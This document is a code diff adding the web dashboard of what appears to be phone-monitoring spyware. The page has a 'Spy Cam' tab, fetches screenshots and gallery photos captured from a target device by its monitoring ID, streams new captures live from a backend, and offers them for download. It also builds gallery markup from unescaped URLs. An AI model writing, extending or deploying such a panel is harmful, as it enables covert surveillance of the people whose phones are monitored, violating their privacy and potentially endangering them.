@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Screenshots & Gallery</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    <style>
+        * { box-sizing: border-box; }
+        body { background: #0f0f0f; color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px; min-height: 100vh; }
+        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; }
+        .back-btn { background: rgba(255,255,255,0.1); padding: 10px 15px; border-radius: 12px; color: #fff; text-decoration: none; }
+        .page-title { font-weight: bold; text-transform: uppercase; letter-spacing: 1px; color: #00f3ff; } /* Blue for Screen */
+        
+        /* TABS */
+        .tabs-container { display: flex; gap: 15px; margin-bottom: 25px; background: rgba(255,255,255,0.05); padding: 8px; border-radius: 15px; }
+        .tab-btn { flex: 1; padding: 12px; border: none; background: transparent; color: #666; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; border-radius: 10px; transition: 0.3s; }
+        
+        /* Active Tab Style (Blue for Screen) */
+        .tab-btn.active { background: rgba(0, 243, 255, 0.15); color: #00f3ff; border: 1px solid #00f3ff; }
+        .tab-btn.inactive:hover { background: rgba(255,255,255,0.1); color: #fff; }
+
+        /* GRID */
+        .gallery-container { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; padding-bottom: 20px; }
+        .img-card { background: #000; border-radius: 12px; overflow: hidden; position: relative; border: 1px solid #333; height: 250px; display: flex; align-items: center; justify-content: center; }
+        .img-card img { width: 100%; height: 100%; object-fit: contain; }
+        .source-badge { position: absolute; bottom: 0; width: 100%; background: rgba(0,0,0,0.8); color: #00f3ff; font-size: 0.7rem; padding: 6px; text-align: center; text-transform: uppercase; font-weight: bold; }
+
+        /* UTILS */
+        .loader { border: 3px solid #333; border-top: 3px solid #00f3ff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .status-msg { text-align: center; color: #666; margin-top: 50px; }
+        .load-more-btn { background: #333; color: #fff; border: 1px solid #555; padding: 10px 25px; border-radius: 20px; display: block; margin: 20px auto; cursor: pointer; }
+
+        /* MODAL */
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 1000; flex-direction: column; align-items: center; justify-content: center; }
+        .modal img { max-width: 100%; max-height: 80vh; object-fit: contain; }
+        .modal-actions { margin-top: 20px; display: flex; gap: 15px; }
+        .action-btn { background: #333; color: #fff; padding: 8px 20px; border-radius: 20px; text-decoration: none; border: 1px solid #555; }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <a href="javascript:history.back()" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
+        <div class="page-title">Screenshots</div>
+        <div style="width: 40px;"></div>
+    </div>
+
+    <div class="tabs-container">
+        <button class="tab-btn inactive" onclick="navigateTo('camera.html')">
+            <i class="fa-solid fa-eye"></i> Spy Cam
+        </button>
+        <button class="tab-btn active">
+            <i class="fa-solid fa-mobile-screen"></i> Screen Only
+        </button>
+    </div>
+
+    <div id="loading" class="loader"></div>
+    <div id="emptyState" class="status-msg" style="display: none;">No Screenshots found.</div>
+    <div class="gallery-container" id="galleryGrid"></div>
+    <button id="loadMoreBtn" class="load-more-btn" onclick="fetchNextPage()" style="display: none;">Load More</button>
+
+    <div id="imageModal" class="modal" onclick="if(event.target === this) closeModal()">
+        <img id="fullImage" src="">
+        <div class="modal-actions">
+            <a id="downloadLink" href="#" target="_blank" class="action-btn">Download</a>
+            <button onclick="closeModal()" class="action-btn">Close</button>
+        </div>
+    </div>
+
+    <script>
+        const API_BASE = 'https://child-v9no.onrender.com'; 
+        const urlParams = new URLSearchParams(window.location.search);
+        const DEVICE_ID = urlParams.get('id') || localStorage.getItem('monitoring_id');
+        let allFilesData = [];
+        let nextCursor = null;
+        let isLoading = false;
+        const socket = io(API_BASE, { transports: ['websocket', 'polling'] });
+
+        // Page Switcher
+        function navigateTo(page) {
+            if(DEVICE_ID) window.location.href = `${page}?id=${DEVICE_ID}`;
+            else window.location.href = page;
+        }
+
+        window.onload = function() {
+            if(!DEVICE_ID) return alert("Device ID Missing!");
+            fetchFiles(true);
+            
+            socket.on('new-file', (data) => {
+                if (data.device_id === DEVICE_ID) {
+                    // Check if it's NOT a camera file
+                    let u = data.url.toLowerCase();
+                    let isCam = u.includes('front') || u.includes('back') || u.includes('cam');
+                    
+                    if(!isCam) {
+                        if(!allFilesData.includes(data.url)) {
+                            allFilesData.unshift(data.url);
+                            renderGallery();
+                        }
+                    }
+                }
+            });
+        };
+
+        function fetchFiles(isReset = false) {
+            if (isLoading) return;
+            isLoading = true;
+            document.getElementById('loading').style.display = isReset ? 'block' : 'none';
+
+            let url = `${API_BASE}/api/gallery-list/${DEVICE_ID}?limit=50`; 
+            if (nextCursor && !isReset) url += `&next_cursor=${nextCursor}`;
+
+            fetch(url).then(res => res.json()).then(data => {
+                document.getElementById('loading').style.display = 'none';
+                isLoading = false;
+                
+                let newFiles = data.photos || [];
+                nextCursor = data.next_cursor || null;
+                document.getElementById('loadMoreBtn').style.display = nextCursor ? 'block' : 'none';
+
+                if(isReset) allFilesData = newFiles;
+                else allFilesData = [...allFilesData, ...newFiles];
+
+                renderGallery();
+            }).catch(e => console.error(e));
+        }
+
+        function fetchNextPage() { if(nextCursor) fetchFiles(false); }
+
+        function renderGallery() {
+            const grid = document.getElementById('galleryGrid');
+            grid.innerHTML = '';
+            
+            // 🔥 FILTER: Everything EXCEPT Camera
+            const filtered = allFilesData.filter(url => {
+                let u = url.toLowerCase();
+                let isCam = u.includes('front') || u.includes('back') || u.includes('cam');
+                return !isCam; 
+            });
+
+            if(filtered.length === 0) document.getElementById('emptyState').style.display = 'block';
+            else document.getElementById('emptyState').style.display = 'none';
+
+            filtered.forEach(url => {
+                let badge = "Screen/Gallery";
+                if(url.toLowerCase().includes('screen')) badge = "Screenshot";
+                else if(url.toLowerCase().includes('gallery')) badge = "Gallery File";
+
+                grid.innerHTML += `
+                    <div class="img-card" onclick="openModal('${url}')">
+                        <img src="${url}" loading="lazy">
+                        <div class="source-badge">${badge}</div>
+                    </div>`;
+            });
+        }
+
+        function openModal(url) {
+            document.getElementById('fullImage').src = url;
+            document.getElementById('downloadLink').href = url;
+            document.getElementById('imageModal').style.display = 'flex';
+        }
+        function closeModal() { document.getElementById('imageModal').style.display = 'none'; }
+    </script>
+</body>
+</html>
